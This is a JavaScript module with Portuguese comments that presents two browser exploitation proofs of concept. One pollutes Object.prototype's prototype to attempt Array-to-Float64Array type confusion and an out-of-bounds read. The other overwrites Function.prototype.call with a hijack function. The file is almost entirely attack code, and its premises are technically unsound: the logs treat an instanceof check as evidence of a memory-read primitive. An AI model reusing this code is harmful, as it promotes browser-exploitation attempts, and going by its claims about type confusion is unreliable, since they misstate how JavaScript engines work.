// js/script3/testAdvancedPP.mjs
// ATUALIZADO PARA TENTAR PROVAS DE CONCEITO (PoC) DE EXPLORAÇÃO

import { logS3, PAUSE_S3 } from './s3_utils.mjs';

/**
 * PoC 1: Tenta causar Confusão de Tipos (Type Confusion) poluindo __proto__
 * e verifica se um objeto Array pode ser tratado como um Float64Array.
 */
async function testTypeConfusionPoC() {
    const FNAME = 'TypeConfusionPoC';
    logS3(`--- PoC 1: Tentando Confusão de Tipos (Array -> Float64Array) ---`, 'test', FNAME);
    const originalProto = Object.prototype.__proto__;
    let success = false;

    try {
        logS3('Poluindo Object.prototype.__proto__ para ser o protótipo de Float64Array...', 'info', FNAME);
        Object.prototype.__proto__ = Float64Array.prototype;

        let victim = [1.1, 2.2]; // Nosso array vítima
        logS3(`Vítima é um Array: ${Array.isArray(victim)}`, 'info', FNAME);

        if (victim instanceof Float64Array) {
            logS3('VULN: Confusão de Tipos bem-sucedida! A vítima Array agora é uma instância de Float64Array.', 'vuln', FNAME);
            success = true;
        } else {
            logS3('FALHA: A confusão de tipos não funcionou como esperado.', 'warn', FNAME);
        }

        if (success) {
            logS3('AVISO: Tentando ler um índice fora do limite (OOB) no array confundido. ISSO PODE TRAVAR O NAVEGADOR.', 'critical', FNAME);
            await PAUSE_S3(1000); // Pausa para o usuário ler o aviso

            // Se a confusão funcionou, a estrutura interna do 'victim' pode ser mal interpretada,
            // permitindo ler além dos seus limites originais.
            let oob_value = victim[10]; // Tenta ler memória adjacente
            logS3(`LEITURA OOB: Valor lido no índice 10: ${oob_value}`, 'vuln', FNAME);
            logS3('Se o navegador não travou, a leitura OOB pode não ter atingido uma área crítica, mas a primitiva pode existir.', 'good', FNAME);
        }

    } catch (e) {
        logS3(`ERRO durante a PoC de Confusão de Tipos: ${e.message}`, 'error', FNAME);
        logS3('Um erro (ex: RangeError) aqui pode ser um bom sinal, indicando que o motor detectou o acesso inválido.', 'info', FNAME);
    } finally {
        logS3('Limpando a poluição do protótipo...', 'info', FNAME);
        Object.prototype.__proto__ = originalProto; // Restauração crucial
    }
}


/**
 * PoC 2: Tenta sequestrar a função 'Function.prototype.call' para executar nosso próprio código.
 */
async function testCallHijackPoC() {
    const FNAME = 'CallHijackPoC';
    logS3(`--- PoC 2: Tentando Sequestro de Fluxo via 'Function.prototype.call' ---`, 'test', FNAME);
    const originalCallDescriptor = Object.getOwnPropertyDescriptor(Function.prototype, 'call');
    let hijacked = false;

    try {
        const hijackFunction = function(...args) {
            // Não chame a função original aqui para evitar recursão infinita
            logS3(`!!! Function.prototype.call SEQUESTRADO !!!`, 'escalation', FNAME);
            logS3(`'this' recebido: ${typeof this}, Argumentos: ${args.length}`, 'escalation', FNAME);
            hijacked = true;
        };

        logS3("Poluindo 'Function.prototype.call' com nossa função maliciosa...", 'info', FNAME);
        Object.defineProperty(Function.prototype, 'call', {
            value: hijackFunction,
            writable: true,
            configurable: true
        });

        logS3("Disparando um gatilho: 'Math.max.call(null, 1, 5, 2)'", 'info', FNAME);
        await PAUSE_S3(500);

        // Dispara a chamada. Se o hijack funcionou, nossa mensagem aparecerá.
        try {
            Math.max.call(null, 1, 5, 2);
        } catch (e) {
            logS3(`Erro esperado ao chamar gatilho (a função hijack não retorna nada): ${e.message}`, 'info', FNAME)
        }
        
        if (!hijacked) {
             logS3('FALHA: O sequestro de "call" não foi detectado.', 'error', FNAME);
        }

    } catch (e) {
        logS3(`ERRO durante a PoC de Sequestro de 'call': ${e.message}`, 'error', FNAME);
    } finally {
        logS3("Limpando a poluição de 'call', restaurando a função original...", 'info', FNAME);
        if (originalCallDescriptor) {
            Object.defineProperty(Function.prototype, 'call', originalCallDescriptor);
        }
    }
}

/**
 * Função principal que orquestra a execução das Provas de Conceito de Exploração.
 */
export async function runExploitationPoCs() {
    await testTypeConfusionPoC();
    await PAUSE_S3(2000); // Pausa entre os testes
    await testCallHijackPoC();
}
